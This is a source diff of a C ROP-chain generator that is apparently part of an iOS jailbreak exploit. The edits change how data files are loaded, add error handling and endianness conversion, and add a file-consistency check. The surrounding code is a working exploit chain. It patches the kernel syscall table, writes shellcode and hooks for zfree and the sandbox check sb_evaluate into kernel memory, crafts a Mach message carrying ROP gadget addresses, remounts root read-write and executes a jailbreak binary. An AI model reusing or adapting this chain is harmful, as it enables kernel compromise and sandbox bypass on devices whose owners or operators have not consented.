@@ -9,6 +9,8 @@
 #include "fsgen-mac-defines.h"
 #include "fsgen-global-constants.h"
 
+#include "endianness.h"
+
 typedef unsigned int Addr;
 
 int STRLEN_PID;
@@ -34,6 +36,7 @@ Addr varsBaseAddr;
 unsigned int varsWritten;
 
 FILE* outFile;
+char dataPath[1024];
 
 short fsgetPadding(unsigned char data) {
 	int i, v = 1;
@@ -461,7 +464,7 @@ void prepareMount(Addr vndevice, Addr mntPoint, char* vnimage) {
 
         ropLoadReg0Const(newString(vnimage));
 	ropSaveReg0(vn + 0x00); // vn.vn_file
-	ropLoadReg0Const(vncontrol_readwrite_io_e);
+	ropLoadReg0Const((int)vncontrol_readwrite_io_e);
 	ropSaveReg0(vn + 0x08); // vn.vn_control
 
 	ropLoadReg0(ptrFd);
@@ -502,7 +505,9 @@ void _remountroot() {
         ropLoadReg0Const(newString("/dev/disk0s1s1"));
 	ropSaveReg0(remountArgs + 0x00); // mount_args.fspec
 
-        ropCall4(dscs + offsets->_dsc_mount, newString("hfs"), newString("/"), MNT_UPDATE, remountArgs);
+	unsigned int p2 = newString("/");
+	unsigned int p1 = newString("hfs");
+        ropCall4(dscs + offsets->_dsc_mount, p1, p2, MNT_UPDATE, remountArgs);
 
 	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c);
         ropCall3(dscs + offsets->_dsc_syslog, LOG_WARNING, newString("* mount returned: %d\n"), PLACE_HOLDER);
@@ -543,11 +548,21 @@ void bootstrap()
 
 	// - syscalls table restore (generated at ROP compile time)
 	FILE* f;
+	char fileName[1024];
+	int len = 0;
 	unsigned int j;
 	unsigned int sysentRestore[0x80];
-	f = fopen("sysent_1c50", "rb");
-	fread(&sysentRestore[0], 4, 0x80, f);
-	fclose(f);
+	snprintf(fileName, sizeof(fileName), "%s/sysent_1c50", dataPath);
+	f = fopen(fileName, "rb");
+	if (f) {
+		fread(&sysentRestore[0], 4, 0x80, f);
+		fclose(f);
+	} else {
+		fprintf(stderr, "Error opening '%s'\n", fileName);
+	}
+	for (j = 0; j < 0x80; j++) {
+		sysentRestore[j] = le32toh(sysentRestore[j]);
+	}
 	// quick syscall restore
         for (j = 0; j < 0x2b; j++) {
 		ropCall3(dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + (j << 2) - 4, sysentRestore[j]); // -4 because of the gadget doing a str [rx, #4]
@@ -558,27 +573,39 @@ void bootstrap()
 	ropCall3(dscs + offsets->_dsc_syscall, 309, offsets->SYSENT + 0x1c50 + 0x1f8 - 4, sysentRestore[0x1f8 >> 2]);
 
 	// zfree hooker
-	f = fopen("zfreehooker.bin", "rb");
-        fseek(f, 0, SEEK_END);
-        int len = ftell(f);
-        fseek(f, 0, SEEK_SET);
-	unsigned int zfreehooker[len >> 2];
-	fread(&zfreehooker[0], 4, len >> 2, f);
-	fclose(f);
-	for (j = 0; j < (len >> 2); j++) {
-		ropCall3(dscs + offsets->_dsc_syscall, 309, ZFREEHOOKER_ADDR + (j << 2) - 4, zfreehooker[j]);
+	snprintf(fileName, sizeof(fileName), "%s/zfreehooker.bin", dataPath);
+	f = fopen(fileName, "rb");
+	if (f) {
+		fseek(f, 0, SEEK_END);
+		len = ftell(f);
+		fseek(f, 0, SEEK_SET);
+		unsigned int zfreehooker[len >> 2];
+		fread(&zfreehooker[0], 4, len >> 2, f);
+		fclose(f);
+		for (j = 0; j < (len >> 2); j++) {
+			zfreehooker[j] = le32toh(zfreehooker[j]);
+			ropCall3(dscs + offsets->_dsc_syscall, 309, ZFREEHOOKER_ADDR + (j << 2) - 4, zfreehooker[j]);
+		}
+	} else {
+		fprintf(stderr, "Error opening '%s'\n", fileName);
 	}
 
 	// zfree hook
-	f = fopen("zfreehook.bin", "rb");
-        fseek(f, 0, SEEK_END);
-        len = ftell(f);
-        fseek(f, 0, SEEK_SET);
-	unsigned int zfreehook[len >> 2];
-	fread(&zfreehook[0], 4, len >> 2, f);
-	fclose(f);
-	for (j = 0; j < (len >> 2); j++) {
-		ropCall3(dscs + offsets->_dsc_syscall, 309, ZFREEHOOK_ADDR + (j << 2) - 4, zfreehook[j]);
+	snprintf(fileName, sizeof(fileName), "%s/zfreehook.bin", dataPath);
+	f = fopen(fileName, "rb");
+	if (f) {
+		fseek(f, 0, SEEK_END);
+		len = ftell(f);
+		fseek(f, 0, SEEK_SET);
+		unsigned int zfreehook[len >> 2];
+		fread(&zfreehook[0], 4, len >> 2, f);
+		fclose(f);
+		for (j = 0; j < (len >> 2); j++) {
+			zfreehook[j] = le32toh(zfreehook[j]);
+			ropCall3(dscs + offsets->_dsc_syscall, 309, ZFREEHOOK_ADDR + (j << 2) - 4, zfreehook[j]);
+		}
+	} else {
+		fprintf(stderr, "Error opening '%s'\n", fileName);
 	}
 
 	// invalidate all dcache
@@ -589,39 +616,57 @@ void bootstrap()
 	ropCall3(dscs + offsets->_dsc_syscall, 308, USELESS, USELESS);
 
 	// shellcode copy
-	f = fopen("shellcode.bin", "rb");
-        fseek(f, 0, SEEK_END);
-        len = ftell(f);
-        fseek(f, 0, SEEK_SET);
-	unsigned int shellcode[len >> 2];
-	fread(&shellcode[0], 4, len >> 2, f);
-	fclose(f);
-	for (j = 0; j < (len >> 2); j++) {
-		ropCall3(dscs + offsets->_dsc_syscall, 309, SHELLCODE_ADDR + (j << 2) - 4, shellcode[j]);
+	snprintf(fileName, sizeof(fileName), "%s/shellcode.bin", dataPath);
+	f = fopen(fileName, "rb");
+	if (f) {
+		fseek(f, 0, SEEK_END);
+		len = ftell(f);
+		fseek(f, 0, SEEK_SET);
+		unsigned int shellcode[len >> 2];
+		fread(&shellcode[0], 4, len >> 2, f);
+		fclose(f);
+		for (j = 0; j < (len >> 2); j++) {
+			shellcode[j] = le32toh(shellcode[j]);
+			ropCall3(dscs + offsets->_dsc_syscall, 309, SHELLCODE_ADDR + (j << 2) - 4, shellcode[j]);
+		}
+	} else {
+		fprintf(stderr, "Error opening '%s'\n", fileName);
 	}
 
 	// sb_evaluate hooker
-	f = fopen("sb_evaluatehooker.bin", "rb");
-        fseek(f, 0, SEEK_END);
-        len = ftell(f);
-        fseek(f, 0, SEEK_SET);
-	unsigned int sb_evaluatehooker[len >> 2];
-	fread(&sb_evaluatehooker[0], 4, len >> 2, f);
-	fclose(f);
-	for (j = 0; j < (len >> 2); j++) {
-		ropCall3(dscs + offsets->_dsc_syscall, 309, SB_EVALUATEHOOKER_ADDR + (j << 2) - 4, sb_evaluatehooker[j]);
+	snprintf(fileName, sizeof(fileName), "%s/sb_evaluatehooker.bin", dataPath);
+	f = fopen(fileName, "rb");
+	if (f) {
+		fseek(f, 0, SEEK_END);
+		len = ftell(f);
+		fseek(f, 0, SEEK_SET);
+		unsigned int sb_evaluatehooker[len >> 2];
+		fread(&sb_evaluatehooker[0], 4, len >> 2, f);
+		fclose(f);
+		for (j = 0; j < (len >> 2); j++) {
+			sb_evaluatehooker[j] = le32toh(sb_evaluatehooker[j]);
+			ropCall3(dscs + offsets->_dsc_syscall, 309, SB_EVALUATEHOOKER_ADDR + (j << 2) - 4, sb_evaluatehooker[j]);
+		}
+	} else {
+		fprintf(stderr, "Error opening '%s'\n", fileName);
 	}
 
 	// sb_evaluate hook
-	f = fopen("sb_evaluatehook.bin", "rb");
-        fseek(f, 0, SEEK_END);
-        len = ftell(f);
-        fseek(f, 0, SEEK_SET);
-	unsigned int sb_evaluatehook[len >> 2];
-	fread(&sb_evaluatehook[0], 4, len >> 2, f);
-	fclose(f);
-	for (j = 0; j < (len >> 2); j++) {
-		ropCall3(dscs + offsets->_dsc_syscall, 309, SB_EVALUATEHOOK_ADDR + (j << 2) - 4, sb_evaluatehook[j]);
+	snprintf(fileName, sizeof(fileName), "%s/sb_evaluatehook.bin", dataPath);
+	f = fopen(fileName, "rb");
+	if (f) {
+		fseek(f, 0, SEEK_END);
+		len = ftell(f);
+		fseek(f, 0, SEEK_SET);
+		unsigned int sb_evaluatehook[len >> 2];
+		fread(&sb_evaluatehook[0], 4, len >> 2, f);
+		fclose(f);
+		for (j = 0; j < (len >> 2); j++) {
+			sb_evaluatehook[j] = le32toh(sb_evaluatehook[j]);
+			ropCall3(dscs + offsets->_dsc_syscall, 309, SB_EVALUATEHOOK_ADDR + (j << 2) - 4, sb_evaluatehook[j]);
+		}
+	} else {
+		fprintf(stderr, "Error opening '%s'\n", fileName);
 	}
 
 	// invalidate all dcache
@@ -648,9 +693,10 @@ void bootstrap()
 	ropLog("* Finished. Executing hello.\n");
 
         ropCall2(dscs + offsets->_dsc_chmod, newString("/var/mobile/Media/corona/jailbreak"), 0755);
-        ropCall3(dscs + offsets->_dsc_execl, newString("/var/mobile/Media/corona/jailbreak"), newString("/var/mobile/Media/corona/jailbreak"), 0);
+	unsigned int p2 = newString("/var/mobile/Media/corona/jailbreak");
+	unsigned int p1 = newString("/var/mobile/Media/corona/jailbreak");
+        ropCall3(dscs + offsets->_dsc_execl, p1, p2, 0);
 	ropCall1(dscs + offsets->_dsc_exit, 0);
-
 }
 
 void exploit()
@@ -877,10 +923,10 @@ void exploit()
 
         memset(&msg, 0, sizeof(msg));
 
-        msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_COPY_SEND);
-        msg.header.msgh_size = sizeof(msg);
-        msg.header.msgh_id = dscs + offsets->GADGET_ADD_SP_120_POP8_10_4567 - 100;
-        msg.pc = dscs + offsets->GADGET_MOV_SP_R4_POP8_10_11_4567;
+        msg.header.msgh_bits = htole32(MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_COPY_SEND));
+        msg.header.msgh_size = htole32(sizeof(msg));
+        msg.header.msgh_id = htole32(dscs + offsets->GADGET_ADD_SP_120_POP8_10_4567 - 100);
+        msg.pc = htole32(dscs + offsets->GADGET_MOV_SP_R4_POP8_10_11_4567);
 
         Addr aMsg = newBinary(&msg, sizeof(struct trojan_msg));
         ropLoadReg0(aPort);
@@ -980,6 +1026,95 @@ void exploit()
 
 }
 
+int fsgen_check_consistency(const char* firmwareName, const char* deviceName)
+{
+	int device = -1;
+	int firmware = -1;
+	int i;
+	for (i = 0; i < MAX_FIRMWARE; ++i) {
+		if (strcmp(firmwareName, firmwares[i]) == 0) {
+			firmware = i;
+			break;
+		}
+	}
+
+	if (firmware == -1) {
+		fprintf(stderr, "Unrecognized firmware: %s\n", firmwareName);
+		return -1;
+	}
+
+	for (i = 0; i < MAX_DEVICE; ++i) {
+		if (strcmp(deviceName, devices[i]) == 0) {
+			device = i;
+			break;
+		}
+	}
+
+        if (device == -1) {
+		fprintf(stderr, "Unrecognized device: %s\n", deviceName);
+		return -1;
+	}
+
+	// check for required files
+	char dPath[1024];
+	char fName[1024];
+	FILE *f = NULL;
+
+	// data path
+        snprintf(dPath, sizeof(dPath), "data/%s/%s/fsgen", firmwareName, deviceName);
+
+	// check files
+	snprintf(fName, sizeof(fName), "%s/sysent_1c50", dPath);
+	f = fopen(fName, "rb");
+	if (!f) {
+		fprintf(stderr, "ERROR: missing file '%s'\n", fName);
+		return -2;
+	}
+	fclose(f);
+
+	snprintf(fName, sizeof(fName), "%s/zfreehooker.bin", dPath);
+	f = fopen(fName, "rb");
+	if (!f) {
+		fprintf(stderr, "ERROR: missing file '%s'\n", fName);
+		return -2;
+	}
+	fclose(f);
+
+	snprintf(fName, sizeof(fName), "%s/zfreehook.bin", dPath);
+	f = fopen(fName, "rb");
+	if (!f) {
+		fprintf(stderr, "ERROR: missing file '%s'\n", fName);
+		return -2;
+	}
+	fclose(f);
+
+	snprintf(fName, sizeof(fName), "%s/shellcode.bin", dPath);
+	f = fopen(fName, "rb");
+	if (!f) {
+		fprintf(stderr, "ERROR: missing file '%s'\n", fName);
+		return -2;
+	}
+	fclose(f);
+
+	snprintf(fName, sizeof(fName), "%s/sb_evaluatehooker.bin", dPath);
+	f = fopen(fName, "rb");
+	if (!f) {
+		fprintf(stderr, "ERROR: missing file '%s'\n", fName);
+		return -2;
+	}
+	fclose(f);
+
+	snprintf(fName, sizeof(fName), "%s/sb_evaluatehook.bin", dPath);
+	f = fopen(fName, "rb");
+	if (!f) {
+		fprintf(stderr, "ERROR: missing file '%s'\n", fName);
+		return -2;
+	}
+	fclose(f);
+
+	return 0;
+}
+
 int generate_rop(FILE* out, int is_bootstrap, const char* firmwareName, const char* deviceName, int pid_len, unsigned int slide)
 {
         outFile = out;
@@ -1043,13 +1178,7 @@ int generate_rop(FILE* out, int is_bootstrap, const char* firmwareName, const ch
 
         offsets = global_offsets[firmware][device];
 
-	char prevdir[1024];
-	prevdir[0] = '\0';
-	getcwd(prevdir, 1024);
-
-        char path[1024];
-        snprintf(path, sizeof(path), "data/%s/%s/fsgen", firmwareName, deviceName);
-        chdir(path);
+        snprintf(dataPath, sizeof(dataPath), "data/%s/%s/fsgen", firmwareName, deviceName);
 
 	ropOpen();
 
@@ -1061,8 +1190,6 @@ int generate_rop(FILE* out, int is_bootstrap, const char* firmwareName, const ch
             exploit();
 
 	ropClose();
-
-	chdir(prevdir);
 
         return 0;
 }
